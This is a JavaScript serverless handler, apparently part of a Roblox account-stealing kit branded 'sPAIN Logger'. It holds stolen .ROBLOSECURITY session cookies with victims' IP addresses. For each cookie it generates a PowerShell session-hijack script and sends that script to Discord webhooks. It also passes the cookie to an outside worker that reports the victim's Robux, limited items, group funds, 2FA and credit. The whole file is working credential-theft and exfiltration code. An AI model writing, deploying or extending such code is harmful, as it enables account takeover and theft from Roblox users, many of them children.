// api/refresh.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

function buildPowerShell(cookie) {
  const escaped = cookie.replace(/`/g, '``').replace(/"/g, '`"');
  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"='"Windows"'
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}`;
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = 'powershell') {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    await discordSend(url, {
      content: first
        ? `\`\`\`${lang}\n${chunk}${rem.length === 0 ? '\n```' : ''}`
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

// Send a single stat result to Discord
async function sendStat(webhookUrl, stat, info, pageName) {
  const now = new Date().toISOString();
  let fields = [];
  let title = '';

  switch(stat) {
    case 'robux':
      title = '💰 Robux & Pending';
      fields = [
        { name: '💰 Balance',      value: `\`${fmt(info.robux)} R$\``,        inline: true },
        { name: '⏳ Pending',      value: `\`${fmt(info.pendingRobux)} R$\``, inline: true },
      ];
      break;
    case 'summary':
      title = '📈 Robux Summary';
      fields = [
        { name: '📅 Today',    value: `\`${fmt(info.txDay)} R$\``,   inline: true },
        { name: '📅 Week',     value: `\`${fmt(info.txWeek)} R$\``,  inline: true },
        { name: '📅 Year',     value: `\`${fmt(info.txYear)} R$\``,  inline: true },
      ];
      break;
    case 'limiteds':
      title = '🛒 Limiteds / RAP';
      fields = [
        { name: '🛒 Count',  value: `\`${info.limitedsCount}\``,              inline: true },
        { name: '💎 RAP',    value: `\`${fmt(info.limitedsValue)} R$\``,      inline: true },
        { name: '💀 Headless', value: info.hasHeadless ? '✅ Yes' : '❌ No',  inline: true },
        { name: '🤖 Korblox', value: info.hasKorblox  ? '✅ Yes' : '❌ No',  inline: true },
      ];
      break;
    case 'groups':
      title = '👥 Groups';
      fields = [
        { name: '👥 Owned',    value: `\`${info.groupsOwned}\``,             inline: true },
        { name: '🏦 Balance',  value: `\`${fmt(info.groupRobux)} R$\``,      inline: true },
        { name: '⏳ Pending',  value: `\`${fmt(info.groupPending)} R$\``,    inline: true },
      ];
      break;
    case 'account':
      title = '⚙️ Account Info';
      fields = [
        { name: '⭐ Premium',   value: info.isPremium ? '✅ Yes' : '❌ No',   inline: true },
        { name: '📧 Email',     value: info.emailSet,                          inline: true },
        { name: '✅ Verified',  value: info.emailVerified,                     inline: true },
        { name: '🔒 2FA',       value: info.twoFA,                             inline: true },
        { name: '💳 Credit',    value: `\`${info.credit} USD\``,               inline: true },
        { name: '📊 Age',       value: `\`${info.accountAgeDays} days\``,      inline: true },
      ];
      break;
  }

  await discordSend(webhookUrl, {
    embeds: [{
      title,
      color: 0xc026d3,
      fields,
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
      thumbnail: { url: info.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
    }]
  });
}

function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools — Refresh</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78;--border:rgba(192,38,211,0.18)}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid var(--border);border-radius:20px;padding:40px 36px;width:100%;max-width:480px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5)}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:6px;text-align:center}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .sub{text-align:center;font-size:0.75rem;color:var(--muted);margin-bottom:28px;letter-spacing:0.05em}
  .section{margin-bottom:10px}
  .section-title{font-size:0.65rem;text-transform:uppercase;letter-spacing:0.15em;color:var(--muted);margin-bottom:8px;padding-left:2px}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
  .btn{width:100%;background:rgba(192,38,211,0.12);border:1px solid rgba(192,38,211,0.25);color:var(--text);padding:12px 10px;border-radius:10px;font-family:'Inter',sans-serif;font-size:0.78rem;font-weight:600;cursor:pointer;transition:all .2s;text-align:left;display:flex;align-items:center;gap:8px;position:relative;overflow:hidden}
  .btn:hover:not(:disabled){background:rgba(192,38,211,0.22);border-color:rgba(192,38,211,0.5);transform:translateY(-1px)}
  .btn:disabled{opacity:0.45;cursor:not-allowed}
  .btn.sent{background:rgba(34,197,94,0.15);border-color:rgba(34,197,94,0.4);color:#4ade80}
  .btn.loading{background:rgba(192,38,211,0.2);animation:pulse 1s infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.6}}
  .btn-ps{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:14px;border-radius:12px;font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 28px rgba(192,38,211,0.35);transition:all .2s;margin-top:12px}
  .btn-ps:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 0 44px rgba(192,38,211,0.6)}
  .btn-ps:disabled{opacity:.5;cursor:not-allowed}
  .cooldown{text-align:center;font-size:0.68rem;color:var(--muted);margin-top:8px;min-height:18px;letter-spacing:0.04em}
  .divider{border:none;border-top:1px solid rgba(192,38,211,0.1);margin:16px 0}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <div class="sub">Click each stat to send to Discord — 2.5s cooldown between requests</div>

  <div class="section">
    <div class="section-title">💰 Economy</div>
    <div class="grid">
      <button class="btn" id="btn-robux"   onclick="fetchStat('robux')">   💰 Robux & Pending</button>
      <button class="btn" id="btn-summary" onclick="fetchStat('summary')"> 📈 Day / Week / Year</button>
      <button class="btn" id="btn-limiteds"onclick="fetchStat('limiteds')">🛒 Limiteds + RAP</button>
      <button class="btn" id="btn-groups"  onclick="fetchStat('groups')">  👥 Groups Balance</button>
    </div>
  </div>

  <hr class="divider">

  <div class="section">
    <div class="section-title">🔐 Account</div>
    <div class="grid">
      <button class="btn" id="btn-account" onclick="fetchStat('account')"> ⚙️ Account Details</button>
    </div>
  </div>

  <hr class="divider">

  <button class="btn-ps" id="btn-ps" onclick="fetchStat('powershell')">🔄 Get Fresh PowerShell</button>
  <div class="cooldown" id="cooldown"></div>
</div>

<script>
const ID = '${id}';
let lastClick = 0;
const COOLDOWN = 2500;

async function fetchStat(stat) {
  const now = Date.now();
  const diff = now - lastClick;
  const cd = document.getElementById('cooldown');

  if (diff < COOLDOWN) {
    const wait = ((COOLDOWN - diff) / 1000).toFixed(1);
    cd.textContent = '⏳ Wait ' + wait + 's before next request...';
    setTimeout(() => { cd.textContent = ''; }, COOLDOWN - diff);
    return;
  }

  lastClick = now;
  const btnId = stat === 'powershell' ? 'btn-ps' : 'btn-' + stat;
  const btn = document.getElementById(btnId);
  const origText = btn.textContent;
  btn.disabled = true;
  btn.className = btn.className.replace('btn-ps','btn-ps') + (stat !== 'powershell' ? ' loading' : '');
  if (stat === 'powershell') { btn.textContent = 'Sending...'; }
  cd.textContent = '';

  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: ID, stat })
    });
    const d = await r.json();
    if (d.success) {
      if (stat !== 'powershell') {
        btn.className = btn.className.replace(' loading','') + ' sent';
        btn.textContent = '✓ ' + origText.trim();
      } else {
        btn.textContent = '✓ Sent to Discord!';
        btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
      }
      cd.textContent = '✅ Sent to Discord!';
      setTimeout(() => {
        btn.disabled = false;
        btn.textContent = origText;
        btn.className = btn.className.replace(' sent','').replace(' loading','');
        if (stat === 'powershell') btn.style.background = '';
        cd.textContent = '';
      }, 3000);
    } else {
      btn.disabled = false;
      btn.textContent = origText;
      btn.className = btn.className.replace(' loading','');
      cd.textContent = '❌ ' + (d.error || 'Failed');
      setTimeout(() => { cd.textContent = ''; }, 3000);
    }
  } catch {
    btn.disabled = false;
    btn.textContent = origText;
    btn.className = btn.className.replace(' loading','');
    cd.textContent = '❌ Network error';
    setTimeout(() => { cd.textContent = ''; }, 3000);
  }

  // Start cooldown display
  let remaining = COOLDOWN;
  const tick = setInterval(() => {
    remaining -= 100;
    if (remaining <= 0) { clearInterval(tick); if (!cd.textContent.startsWith('✅') && !cd.textContent.startsWith('❌')) cd.textContent = ''; }
    else if (!cd.textContent.startsWith('✅') && !cd.textContent.startsWith('❌')) {
      cd.textContent = '⏳ Cooldown: ' + (remaining/1000).toFixed(1) + 's';
    }
  }, 100);
}
</script>
</body>
</html>`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  if (req.method === 'GET') {
    const refreshId = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!refreshId) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Missing refresh ID</h1>');
    }
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Link expired or not found</h1>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  if (req.method === 'POST') {
    const body   = parseBody(req.body);
    const postId = body?.id;
    const stat   = body?.stat || 'powershell';

    if (!postId) return res.status(400).json({ error: 'id is required' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)        return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);
    const pageName = record.pageName || postId;

    // PowerShell — no API calls needed
    if (stat === 'powershell') {
      const ps = buildPowerShell(record.cookie);
      const now = new Date().toISOString();
      for (const wh of webhooks) {
        await discordSend(wh, {
          embeds: [{
            title: '🔄 Fresh PowerShell',
            description: `Regenerated for **${pageName}**`,
            color: 0x06b6d4,
            footer: { text: `sPAIN Tools • ${now}` }
          }]
        });
        await discordChunked(wh, ps, 'powershell');
      }
      return res.status(200).json({ success: true });
    }

    // All other stats — call worker
    let info;
    try {
      const r = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: record.cookie, victimIp: record.ip || '' })
      });
      if (!r.ok) return res.status(502).json({ error: 'Worker failed' });
      info = await r.json();
    } catch (e) {
      return res.status(502).json({ error: 'Worker unreachable' });
    }

    if (!info?.valid) return res.status(401).json({ error: 'Cookie invalid or expired' });

    // Check for headless/korblox in limiteds
    if (stat === 'limiteds' && info.limitedNames) {
      info.hasHeadless = info.limitedNames.some(n => n.toLowerCase().includes('headless'));
      info.hasKorblox  = info.limitedNames.some(n => n.toLowerCase().includes('korblox'));
    } else if (stat === 'limiteds') {
      info.hasHeadless = false;
      info.hasKorblox  = false;
    }

    for (const wh of webhooks) await sendStat(wh, stat, info, pageName);

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
